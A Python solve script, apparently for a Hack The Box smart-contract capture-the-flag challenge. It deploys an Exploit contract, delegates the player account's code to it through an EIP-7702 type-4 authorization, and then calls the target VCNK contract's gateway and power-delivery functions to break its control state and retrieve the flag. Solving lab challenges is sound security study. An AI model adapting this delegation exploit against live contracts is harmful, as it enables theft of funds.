#!/usr/bin/env python3

import json

from web3 import Web3
from eth_account import Account
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)

def send_tx(w3: Web3, player_account: Account, tx: dict) -> dict:
    signed_tx = player_account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=10)
    return receipt

if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    player_account = Account.from_key(player_pvk)
    print(f"[+] Player Address: {player_account.address}")
    print(f"[+] Setup Contract Address: {setup_addr}")
    print(f"[+] Target Contract Address: {target_addr}")
    
    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")
    
    with open("out/Exploit.sol/Exploit.json") as f:
        exploit_artifact = json.load(f)
        exploit_abi = exploit_artifact["abi"]
        exploit_bytecode = exploit_artifact["bytecode"]["object"]
        
    with open("out/VCNK.sol/VCNK.json") as f:
        vcnk_artifact = json.load(f)
        vcnk_abi = vcnk_artifact["abi"]
        
    Exploit = w3.eth.contract(abi=exploit_abi, bytecode=exploit_bytecode)
    VCNK = w3.eth.contract(address=target_addr, abi=vcnk_abi)

    tx_deploy_exploit = Exploit.constructor().build_transaction({
        "from": player_account.address,
        "nonce": w3.eth.get_transaction_count(player_account.address),
        "gas": 3_000_000,
    })
    rcpt = send_tx(w3, player_account, tx_deploy_exploit)
    Exploit = w3.eth.contract(address=rcpt.contractAddress, abi=exploit_abi)
    print(f"\n[*] Exploit contract deployed at {Exploit.address}")

    # sign authorization and attach delegation with type 4 transaction
    authorization = {
        "chainId": w3.eth.chain_id,
        "address": Exploit.address,
        "nonce": w3.eth.get_transaction_count(player_account.address) + 1 
    }
    signed_authorization = player_account.sign_authorization(authorization)
    print(f"\n[*] Signed authorization: {signed_authorization}")
    tx = {
        "chainId": w3.eth.chain_id,
        "nonce": w3.eth.get_transaction_count(player_account.address),
        "gas": 1_000_000,
        "maxFeePerGas": w3.to_wei(1, 'gwei'),
        "maxPriorityFeePerGas": w3.to_wei(1, 'gwei'),
        "to": player_account.address,
        "authorizationList": [signed_authorization],
    }
    rcpt = send_tx(w3, player_account, tx)
    print(f"\n[*] type 4 tx receipt: {rcpt}")
    print(f"\n[*] Authorization for {Exploit.address} by {player_account.address} is signed.")
    new_player_account_code = w3.eth.get_code(player_account.address)
    print(f"\n[*] New player account code: {new_player_account_code.hex()}")
    assert len(new_player_account_code) > 0 and new_player_account_code.hex().startswith("ef") # delegation indicator

    # from now on, the code persists in the player EOA until manual reset.
    # i.e. any subsequent type 2 TXs can be sent from the player EOA

    tx_register_gateway = VCNK.functions.registerGateway(player_account.address).build_transaction({
        "from": player_account.address,
        "value": w3.to_wei(20, 'ether'),
        "nonce": w3.eth.get_transaction_count(player_account.address),
    })
    rcpt = send_tx(w3, player_account, tx_register_gateway)
    print(f"\n[*] tx_register_gateway receipt: {rcpt}")

    tx_request_quota_increase = VCNK.functions.requestQuotaIncrease(player_account.address).build_transaction({
        "from": player_account.address,
        "value": w3.to_wei(10, 'ether'),
        "nonce": w3.eth.get_transaction_count(player_account.address),
    })
    rcpt = send_tx(w3, player_account, tx_request_quota_increase)
    print(f"\n[*] tx_request_quota_increase receipt: {rcpt}")

    tx_request_power_delivery = VCNK.functions.requestPowerDelivery(w3.to_wei(10, 'ether'), player_account.address).build_transaction({
        "from": player_account.address,
        "nonce": w3.eth.get_transaction_count(player_account.address),
    })
    rcpt = send_tx(w3, player_account, tx_request_power_delivery)
    print(f"\n[*] tx_request_power_delivery receipt: {rcpt}")

    status, registered, currentCap, allowance = VCNK.functions.controlUnit().call()
    print("VCNK ControlUnit status =", status)
    assert status == 3

    ### get flag ###
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    